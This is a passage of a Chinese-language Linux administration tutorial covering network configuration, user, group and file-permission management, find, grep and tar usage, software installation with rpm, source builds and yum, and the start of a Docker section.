class="line">PROXY_METHOD=<span class="string">&quot;none&quot;</span></span><br><span class="line">BROWSER_ONLY=<span class="string">&quot;no&quot;</span></span><br><span class="line">BOOTPROTO=<span class="string">&quot;static&quot;</span></span><br><span class="line">DEFROUTE=<span class="string">&quot;yes&quot;</span></span><br><span class="line">IPV4_FAILURE_FATAL=<span class="string">&quot;no&quot;</span></span><br><span class="line">IPV6INIT=<span class="string">&quot;yes&quot;</span></span><br><span class="line">IPV6_AUTOCONF=<span class="string">&quot;yes&quot;</span></span><br><span class="line">IPV6_DEFROUTE=<span class="string">&quot;yes&quot;</span></span><br><span class="line">IPV6_FAILURE_FATAL=<span class="string">&quot;no&quot;</span></span><br><span class="line">IPV6_ADDR_GEN_MODE=<span class="string">&quot;stable-privacy&quot;</span></span><br><span class="line">NAME=<span class="string">&quot;ens33&quot;</span></span><br><span class="line">UUID=<span class="string">&quot;571e6521-373a-4fb4-a76f-e9cb7f85afe9&quot;</span></span><br><span class="line">DEVICE=<span class="string">&quot;ens33&quot;</span></span><br><span class="line">ONBOOT=<span class="string">&quot;yes&quot;</span></span><br><span class="line">IPADDR=<span class="string">&quot;192.168.2.112&quot;</span></span><br><span class="line">NETMASK=<span class="string">&quot;255.255.255.0&quot;</span></span><br><span class="line">GATEWAY=<span class="string">&quot;192.168.2.1&quot;</span></span><br><span class="line">DNS1=<span class="string">&quot;192.168.2.1&quot;</span></span><br><span class="line">DNS2=<span class="string">&quot;114.114.114.114&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>重启网卡服务使配置生效：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart network</span><br></pre></td></tr></table></figure><p>测试网络连接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping www.baidu.com</span><br></pre></td></tr></table></figure></li></ol><h2 id="六：文件和文件夹的操作"><a href="#六：文件和文件夹的操作" class="headerlink" title="六：文件和文件夹的操作"></a>六：文件和文件夹的操作</h2><p>具体命令可参考上文的Linux系统操作部分。以下是几篇详细介绍Linux文件和文件夹操作的文章：</p><ul><li><a href="https://blog.csdn.net/luorufeng/article/details/84765059">https://blog.csdn.net/luorufeng/article/details/84765059</a>  </li><li><a href="https://blog.csdn.net/numbibi/article/details/8026841">https://blog.csdn.net/numbibi/article/details/8026841</a>  </li><li><a href="https://www.woniuxy.com/book/reading/214">https://www.woniuxy.com/book/reading/214</a>  </li></ul><h2 id="七：用户与用户组权限"><a href="#七：用户与用户组权限" class="headerlink" title="七：用户与用户组权限"></a>七：用户与用户组权限</h2><h3 id="用户与用户组权限概述"><a href="#用户与用户组权限概述" class="headerlink" title="用户与用户组权限概述"></a>用户与用户组权限概述</h3><p>在Linux中，root用户拥有最高权限，所有文件或文件夹的权限设定对root无效。在生产环境和服务器中，建议使用普通账户并授予必要权限，避免使用root账户以防止安全漏洞导致系统被恶意利用。对于操作系统和应用系统，应遵循零信任原则，始终使用最小权限进行操作。权限不足时再动态授予所需权限。</p><h3 id="用户和用户组管理"><a href="#用户和用户组管理" class="headerlink" title="用户和用户组管理"></a>用户和用户组管理</h3><p>Linux是一个多用户多任务的分时操作系统，每个使用系统资源的用户都必须有一个账号。用户账号管理包括用户账号的添加、删除和修改，以及用户口令的管理。</p><h4 id="添加用户账号"><a href="#添加用户账号" class="headerlink" title="添加用户账号"></a>添加用户账号</h4><p>使用<code>useradd</code>命令添加新用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd [选项] 用户名</span><br></pre></td></tr></table></figure><p>常用选项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-c 添加注释性描述</span><br><span class="line">-d 指定用户主目录</span><br><span class="line">-g 指定用户所属的用户组</span><br><span class="line">-G 指定用户所属的附加组</span><br><span class="line">-s 指定用户的登录Shell</span><br><span class="line">-u 指定用户的用户号</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">useradd -d /home/sam -m sam 创建用户sam，主目录为/home/sam</span><br><span class="line">useradd -s /bin/sh -g group -G adm,root gem 创建用户gem，登录Shell为/bin/sh，主组为group，附加组为adm和root</span><br></pre></td></tr></table></figure><h4 id="删除用户账号"><a href="#删除用户账号" class="headerlink" title="删除用户账号"></a>删除用户账号</h4><p>使用<code>userdel</code>命令删除用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userdel [选项] 用户名</span><br></pre></td></tr></table></figure><p>常用选项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r 删除用户的主目录</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userdel -r sam 删除用户sam及其主目录</span><br></pre></td></tr></table></figure><h4 id="修改用户账号"><a href="#修改用户账号" class="headerlink" title="修改用户账号"></a>修改用户账号</h4><p>使用<code>usermod</code>命令修改用户账号属性：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usermod [选项] 用户名</span><br></pre></td></tr></table></figure><p>常用选项与<code>useradd</code>类似，可修改用户的主目录、用户组、Shell等。</p><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usermod -s /bin/ksh -d /home/z -g developer sam 修改用户sam的Shell、主目录和所属组</span><br></pre></td></tr></table></figure><h4 id="用户口令管理"><a href="#用户口令管理" class="headerlink" title="用户口令管理"></a>用户口令管理</h4><p>使用<code>passwd</code>命令设置或修改用户口令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd [选项] 用户名</span><br></pre></td></tr></table></figure><p>常用选项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-l 锁定用户账户</span><br><span class="line">-u 解锁用户账户</span><br><span class="line">-d 设置用户无口令</span><br><span class="line">-f 强制用户下次登录时修改口令</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">passwd sam 为用户sam设置口令</span><br><span class="line">passwd -l sam 锁定用户sam的账户</span><br></pre></td></tr></table></figure><h3 id="用户组管理"><a href="#用户组管理" class="headerlink" title="用户组管理"></a>用户组管理</h3><p>用户组管理包括添加、删除和修改用户组。</p><h4 id="添加用户组"><a href="#添加用户组" class="headerlink" title="添加用户组"></a>添加用户组</h4><p>使用<code>groupadd</code>命令添加新用户组：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd [选项] 用户组名</span><br></pre></td></tr></table></figure><p>常用选项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-g 指定用户组的GID</span><br><span class="line">-o 允许GID重复</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">groupadd group1 添加用户组group1</span><br><span class="line">groupadd -g 101 group2 添加GID为101的用户组group2</span><br></pre></td></tr></table></figure><h4 id="删除用户组"><a href="#删除用户组" class="headerlink" title="删除用户组"></a>删除用户组</h4><p>使用<code>groupdel</code>命令删除用户组：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupdel 用户组名</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupdel group1 删除用户组group1</span><br></pre></td></tr></table></figure><h4 id="修改用户组属性"><a href="#修改用户组属性" class="headerlink" title="修改用户组属性"></a>修改用户组属性</h4><p>使用<code>groupmod</code>命令修改用户组属性：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupmod [选项] 用户组名</span><br></pre></td></tr></table></figure><p>常用选项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-g 修改用户组的GID</span><br><span class="line">-n 修改用户组名称</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">groupmod -g 102 group2 将用户组group2的GID修改为102</span><br><span class="line">groupmod -n group3 group2 将用户组group2重命名为group3</span><br></pre></td></tr></table></figure><h3 id="与用户账号相关的系统文件"><a href="#与用户账号相关的系统文件" class="headerlink" title="与用户账号相关的系统文件"></a>与用户账号相关的系统文件</h3><h4 id="etc-passwd文件"><a href="#etc-passwd文件" class="headerlink" title="/etc/passwd文件"></a><code>/etc/passwd</code>文件</h4><p>记录系统中每个用户的基本信息，格式为每行一个用户，字段间以冒号分隔：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名:口令:用户ID:组ID:注释:主目录:登录Shell</span><br></pre></td></tr></table></figure><ul><li><strong>用户名</strong>：用户的登录名。</li><li><strong>口令</strong>：早期存放加密后的口令，现代系统通常使用<code>/etc/shadow</code>文件存储口令，此处为<code>x</code>或<code>*</code>。</li><li><strong>用户ID（UID）</strong>：用户标识号，root为0，普通用户从500开始（不同发行版可能不同）。</li><li><strong>组ID（GID）</strong>：用户所属主组的组标识号。</li><li><strong>注释</strong>：用户的真实姓名、电话等信息。</li><li><strong>主目录</strong>：用户登录后的起始目录。</li><li><strong>登录Shell</strong>：用户登录后使用的Shell程序。</li></ul><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br></pre></td></tr></table></figure><h4 id="etc-shadow文件"><a href="#etc-shadow文件" class="headerlink" title="/etc/shadow文件"></a><code>/etc/shadow</code>文件</h4><p>存储用户的加密口令及其他安全相关的信息，格式为每行一个用户，字段间以冒号分隔：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名:加密口令:最后修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:保留字段</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:*:18372:0:99999:7:::</span><br><span class="line">daemon:*:18372:0:99999:7:::</span><br></pre></td></tr></table></figure><h4 id="etc-group文件"><a href="#etc-group文件" class="headerlink" title="/etc/group文件"></a><code>/etc/group</code>文件</h4><p>记录用户组的信息，格式为每行一个组，字段间以冒号分隔：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">组名:口令:组ID:组内用户列表</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root::0:root</span><br><span class="line">bin::2:root,bin</span><br></pre></td></tr></table></figure><h3 id="批量添加用户"><a href="#批量添加用户" class="headerlink" title="批量添加用户"></a>批量添加用户</h3><p>当需要批量创建大量用户时，可以使用以下步骤：</p><ol><li><p>编辑一个用户列表文件，格式与<code>/etc/passwd</code>类似，如<code>user.txt</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user001::600:100:user:/home/user001:/bin/bash</span><br><span class="line">user002::601:100:user:/home/user002:/bin/bash</span><br><span class="line">user003::602:100:user:/home/user003:/bin/bash</span><br></pre></td></tr></table></figure></li><li><p>使用<code>newusers</code>命令导入用户数据：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newusers &lt; user.txt</span><br></pre></td></tr></table></figure></li><li><p>使用<code>vipw</code>或直接编辑<code>/etc/passwd</code>检查用户数据是否正确。</p></li><li><p>执行<code>pwunconv</code>命令，将<code>/etc/shadow</code>中的口令信息转换回<code>/etc/passwd</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwunconv</span><br></pre></td></tr></table></figure></li><li><p>编辑密码文件<code>passwd.txt</code>，格式为<code>用户名:密码</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user001:123456</span><br><span class="line">user002:123456</span><br></pre></td></tr></table></figure></li><li><p>使用<code>chpasswd</code>命令设置用户密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chpasswd &lt; passwd.txt</span><br></pre></td></tr></table></figure></li><li><p>执行<code>pwconv</code>命令，将口令信息重新转换为shadow格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwconv</span><br></pre></td></tr></table></figure></li></ol><p>完成后，检查<code>/home</code>目录下是否生成了用户的主目录，并验证用户是否能正常登录。</p><h3 id="文件和文件夹权限"><a href="#文件和文件夹权限" class="headerlink" title="文件和文件夹权限"></a>文件和文件夹权限</h3><p>Linux系统通过权限机制控制不同用户对文件和文件夹的访问。主要使用<code>chown</code>、<code>chgrp</code>和<code>chmod</code>命令来管理文件的所有者、所属组和权限。</p><h4 id="更改文件所有者和所属组"><a href="#更改文件所有者和所属组" class="headerlink" title="更改文件所有者和所属组"></a>更改文件所有者和所属组</h4><ul><li><p><code>chown</code>：更改文件的所有者和所属组。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chown</span> [选项] 用户名:组名 文件名</span><br></pre></td></tr></table></figure><p>常用选项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-R 递归更改目录及内容的所有者</span><br></pre></td></tr></table></figure></li><li><p><code>chgrp</code>：更改文件的所属组。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chgrp</span> [选项] 组名 文件名</span><br></pre></td></tr></table></figure><p>常用选项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-R 递归更改目录及内容的所属组</span><br></pre></td></tr></table></figure></li></ul><h4 id="更改文件权限"><a href="#更改文件权限" class="headerlink" title="更改文件权限"></a>更改文件权限</h4><ul><li><p><code>chmod</code>：更改文件的权限。</p><p>权限设置有两种方式：数字模式和符号模式。</p><p><strong>数字模式</strong>：</p><p>权限对应数值：</p><p>|权限|数值|<br>|—-|—-|<br>|r（读）|4|<br>|w（写）|2|<br>|x（执行）|1|</p><p>例如，权限<code>rwxr-xr--</code>对应的数值为<code>754</code>。</p><p>使用方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 754 文件名</span><br></pre></td></tr></table></figure><p><strong>符号模式</strong>：</p><p>格式为<code>[ugoa][+-=][rwx]</code>，其中：</p><ul><li><code>u</code>：用户（文件所有者）</li><li><code>g</code>：组（文件所属组）</li><li><code>o</code>：其他用户</li><li><code>a</code>：所有用户（<code>u</code>、<code>g</code>、<code>o</code>的组合）</li></ul><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u=rwx,g=rx,o=r 文件名 设置文件权限为rwxr-xr--</span><br><span class="line"><span class="built_in">chmod</span> a-x 文件名 去掉所有用户的执行权限</span><br></pre></td></tr></table></figure></li></ul><h2 id="八：文件查找与归档压缩"><a href="#八：文件查找与归档压缩" class="headerlink" title="八：文件查找与归档压缩"></a>八：文件查找与归档压缩</h2><h3 id="Linux文件查找命令find"><a href="#Linux文件查找命令find" class="headerlink" title="Linux文件查找命令find"></a>Linux文件查找命令<code>find</code></h3><p><code>find</code>命令用于在指定目录下查找文件。基本语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find path -option [ -<span class="built_in">print</span> ] [ -<span class="built_in">exec</span> -ok <span class="built_in">command</span> ] &#123;&#125; \;</span><br></pre></td></tr></table></figure><p>常用选项：</p><div class="table-container"><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td>-name</td><td>按文件名查找</td></tr><tr><td>-type</td><td>指定文件类型（<code>d</code>目录，<code>f</code>文件等）</td></tr><tr><td>-mtime</td><td>按文件修改时间查找</td></tr><tr><td>-size</td><td>按文件大小查找</td></tr><tr><td>-exec</td><td>对查找结果执行命令</td></tr><tr><td>-ok</td><td>与-exec类似，但会提示确认</td></tr></tbody></table></div><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">find . -name <span class="string">&quot;*.c&quot;</span> 查找当前目录及其子目录下所有.c文件</span><br><span class="line">find . -<span class="built_in">type</span> f 查找当前目录及其子目录下的所有普通文件</span><br><span class="line">find . -ctime 20 查找当前目录及其子目录下最近20天内创建的文件</span><br><span class="line">find /var/log -<span class="built_in">type</span> f -mtime +7 -ok <span class="built_in">rm</span> &#123;&#125; \; 查找并删除/var/log目录下7天前修改的文件（需确认）</span><br><span class="line">find . -perm 644 -<span class="built_in">exec</span> <span class="built_in">ls</span> -l &#123;&#125; \; 查找当前目录下权限为644的文件并显示详细信息</span><br><span class="line">find / -<span class="built_in">type</span> f -size 0 -<span class="built_in">exec</span> <span class="built_in">ls</span> -l &#123;&#125; \; 查找系统中所有大小为0的文件</span><br></pre></td></tr></table></figure><h3 id="Linuxgrep命令"><a href="#Linuxgrep命令" class="headerlink" title="Linuxgrep命令"></a>Linux<code>grep</code>命令</h3><p><code>grep</code>命令用于在文件中搜索指定的字符串。基本语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep [选项] 模式 文件</span><br></pre></td></tr></table></figure><p>常用选项：</p><div class="table-container"><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td>-i</td><td>忽略大小写</td></tr><tr><td>-r</td><td>递归搜索目录</td></tr><tr><td>-n</td><td>显示行号</td></tr><tr><td>-l</td><td>仅列出包含匹配行的文件名</td></tr><tr><td>-v</td><td>反向查找，显示不匹配的行</td></tr></tbody></table></div><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="built_in">test</span> *file 查找当前目录中文件名包含file的文件，并显示包含<span class="built_in">test</span>的行</span><br><span class="line">grep -r update /etc/acpi 查找/etc/acpi目录及其子目录中包含update的文件</span><br><span class="line">grep -v <span class="built_in">test</span> *<span class="built_in">test</span>* 查找文件名包含<span class="built_in">test</span>的文件中不包含<span class="built_in">test</span>的行</span><br></pre></td></tr></table></figure><h3 id="Linuxtar命令"><a href="#Linuxtar命令" class="headerlink" title="Linuxtar命令"></a>Linux<code>tar</code>命令</h3><p><code>tar</code>命令用于文件的打包和压缩。基本语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar [选项] [文件...]</span><br></pre></td></tr></table></figure><p>常用选项：</p><div class="table-container"><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td>-c</td><td>创建新的压缩文件</td></tr><tr><td>-x</td><td>解压文件</td></tr><tr><td>-t</td><td>查看压缩文件内容</td></tr><tr><td>-z</td><td>支持gzip压缩</td></tr><tr><td>-j</td><td>支持bzip2压缩</td></tr><tr><td>-v</td><td>显示操作过程</td></tr><tr><td>-f</td><td>指定压缩文件</td></tr></tbody></table></div><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf test.tar.gz a.c 压缩a.c文件为test.tar.gz</span><br><span class="line">tar -tzvf test.tar.gz 查看压缩文件内容</span><br><span class="line">tar -xzvf test.tar.gz 解压test.tar.gz文件</span><br></pre></td></tr></table></figure><h2 id="九：在Linux中安装应用"><a href="#九：在Linux中安装应用" class="headerlink" title="九：在Linux中安装应用"></a>九：在Linux中安装应用</h2><h3 id="使用rpm离线安装"><a href="#使用rpm离线安装" class="headerlink" title="使用rpm离线安装"></a>使用<code>rpm</code>离线安装</h3><p><code>rpm</code>（Red Hat Package Manager）是Red Hat系列Linux发行版的包管理工具，用于安装、卸载和查询软件包。</p><p>基本语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm [选项] 包名</span><br></pre></td></tr></table></figure><p>常用选项：</p><div class="table-container"><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td>-i</td><td>安装软件包</td></tr><tr><td>-v</td><td>显示详细信息</td></tr><tr><td>-h</td><td>显示进度条</td></tr><tr><td>-e</td><td>卸载软件包</td></tr><tr><td>-q</td><td>查询软件包信息</td></tr></tbody></table></div><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rpm -ivh package.rpm 安装软件包</span><br><span class="line">rpm -e package 查询并卸载软件包</span><br></pre></td></tr></table></figure><h3 id="基于源代码安装应用"><a href="#基于源代码安装应用" class="headerlink" title="基于源代码安装应用"></a>基于源代码安装应用</h3><p>许多Linux软件提供源代码，需要编译后才能使用。安装步骤通常包括：</p><ol><li>下载源码并解压。</li><li>查看<code>INSTALL</code>或<code>README</code>文件了解安装步骤。</li><li>执行<code>./configure</code>生成<code>Makefile</code>。</li><li>执行<code>make</code>编译源码。</li><li>执行<code>make install</code>安装软件。</li></ol><p>示例：安装memcached</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/local/</span><br><span class="line"><span class="built_in">mkdir</span> memcached</span><br><span class="line">wget http://memcached.org/files/memcached-1.4.29.tar.gz</span><br><span class="line">tar -zxvf memcached-1.4.29.tar.gz</span><br><span class="line"><span class="built_in">cd</span> memcached-1.4.29</span><br><span class="line">./configure --prefix=/usr/local/memcached/</span><br><span class="line">make clean</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h3 id="使用yum进行安装（优先级高）"><a href="#使用yum进行安装（优先级高）" class="headerlink" title="使用yum进行安装（优先级高）"></a>使用<code>yum</code>进行安装（优先级高）</h3><p><code>yum</code>（Yellow dog Updater, Modified）是基于RPM的包管理器，自动处理依赖关系，简化软件安装过程。</p><p>基本语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum [选项] [命令] [包名...]</span><br></pre></td></tr></table></figure><p>常用命令：</p><div class="table-container"><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>yum install</td><td>安装软件包</td></tr><tr><td>yum update</td><td>更新软件包</td></tr><tr><td>yum remove</td><td>卸载软件包</td></tr><tr><td>yum list</td><td>列出软件包</td></tr><tr><td>yum search</td><td>搜索软件包</td></tr><tr><td>yum clean</td><td>清理缓存</td></tr></tbody></table></div><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install pam-devel 安装pam-devel软件包</span><br><span class="line">yum remove pam-devel 卸载pam-devel软件包</span><br><span class="line">yum list pam* 列出以pam开头的软件包</span><br></pre></td></tr></table></figure><p>国内常用的<code>yum</code>源包括网易（163）、中科大和搜狐等。配置网易<code>yum</code>源的步骤：</p><ol><li><p>备份默认的<code>CentOS-Base.repo</code>文件：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</span><br></pre></td></tr></table></figure></li><li><p>下载对应版本的repo文件：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CentOS5: wget http://mirrors.163.com/.help/CentOS5-Base-163.repo</span><br><span class="line">CentOS6: wget http://mirrors.163.com/.help/CentOS6-Base-163.repo</span><br><span class="line">CentOS7: wget http://mirrors.163.com/.help/CentOS7-Base-163.repo</span><br></pre></td></tr></table></figure></li><li><p>将下载的文件重命名为<code>CentOS-Base.repo</code>并移动到<code>/etc/yum.repos.d/</code>目录：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> CentOS6-Base-163.repo CentOS-Base.repo</span><br></pre></td></tr></table></figure></li><li><p>生成缓存：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum clean all</span><br><span class="line">yum makecache</span><br></pre></td></tr></table></figure></li></ol><p>配置本地<code>Yum</code>仓库的步骤：</p><ol><li><p>将RHEL6光盘挂载到<code>/media</code>：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/cdrom /media/</span><br></pre></td></tr></table></figure></li><li><p>配置本地Yum客户端：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/yum.repos.d/</span><br><span class="line"><span class="built_in">cp</span> rhel-source.repo rhel6.repo</span><br><span class="line">vim rhel6.repo</span><br></pre></td></tr></table></figure><p> 修改内容如下：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[rhel-6]</span><br><span class="line">name=Red Hat Enterprise Linux 6</span><br><span class="line">baseurl=file:///media/</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-redhat-release</span><br></pre></td></tr></table></figure></li><li><p>验证Yum配置：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum repolist</span><br></pre></td></tr></table></figure></li></ol><p>对于软件安装时提示缺失库的情况，可以使用<code>yum provides</code>查找包含所需库的包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum provides libstdc++.so.6</span><br></pre></td></tr></table></figure><p>根据查询结果安装相应的包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install 包名</span><br></pre></td></tr></table></figure><h2 id="十：Docker基础命令与应用"><a href="#十：Docker基础命令与应用" class="headerlink" title="十：Docker基础命令与应用"></a>十：Docker基础命令与应用</h2><h3 id="查看Docker服务状态"><a href="#查看Docker服务状态" class="headerlink" title="查看Docker服务状态"></a>查看Docker服务状态</h3><p>使用<code>systemctl</code>命令查看Docker服务是否开启：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-unit-files | grep docker</span><br></pre></td></tr></table></figure><p>示例输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker.service                                disabled</span><br><span class="line">docker.socket                                 